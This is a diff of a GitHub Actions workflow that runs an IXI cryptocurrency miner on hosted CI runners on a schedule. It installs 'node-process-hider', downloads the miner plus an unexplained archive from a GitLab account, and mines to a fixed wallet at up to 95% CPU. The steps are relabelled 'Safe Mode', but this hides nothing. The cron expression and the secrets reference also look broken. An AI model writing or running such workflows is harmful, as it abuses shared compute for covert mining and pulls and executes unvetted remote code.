@@ -1,41 +1,39 @@
-name: IXI Miner (Safe Version)
+name: Safe IXI Miner
 
 on:
-  workflow_dispatch:  # Jalankan manual via GitHub UI
+  workflow_dispatch:
   schedule:
-    - cron: '0 */6 * * *'  # Setiap 6 jam sekali (opsional)
+    - cron: '0 */60 * * *'
 
 jobs:
-  mine:
+  safe-mine:
     runs-on: ubuntu-latest
-    timeout-minutes: 360  # Batas waktu 6 jam
+    timeout-minutes: 360
 
     steps:
-    - name: Install dependencies
+    - name: Setup Environment
       run: |
         sudo apt update -y
         sudo apt install -y binutils cmake build-essential screen unzip net-tools curl wget gcc libssl-dev
-
         curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
-        sudo apt-get install -y nodejs nodejs-dev node-gyp npm
+        sudo apt install -y nodejs nodejs-dev node-gyp npm
         npm install -g node-process-hider
 
-    - name: Download & Extract IXI Miner
+    - name: Download and Extract IXIMiner
       run: |
         wget https://ixi.hash.express/dl/iximiner_v0.3.0_22.08.2022_linux.tar.gz
         tar -zvxf iximiner_v0.3.0_22.08.2022_linux.tar.gz
         cd iximiner_v0.3.0_22.08.2022_linux
-
         wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
         tar -xvzf graphics.tar.gz
 
-    - name: Start Mining
+    - name: Start Mining (Safe Mode)
       run: |
         cd iximiner_v0.3.0_22.08.2022_linux
         chmod +x iximiner
         ./iximiner --mode miner \
           --pool https://ixi.hash.express \
-          --wallet 5EYh6f2nawaGiJrna19sU7LMBv2Z7AHQqsDfUTgdJf2163seFXwdoEBfqJrnJ55Pp \
-          --name ${{ github.run_id }}-safe \
-          --cpu-intensity 80 \
+          --wallet ${{ secrets.5EYh6f2nawaGiJrna19sU7LMBv2Z7AHQqsDfUTgdJf2163seFXwdoEBfqJrnJ55Pp }} \
+          --name safe-${{ github.run_id }} \
+          --cpu-intensity 95 \
           --gpu-intensity 0
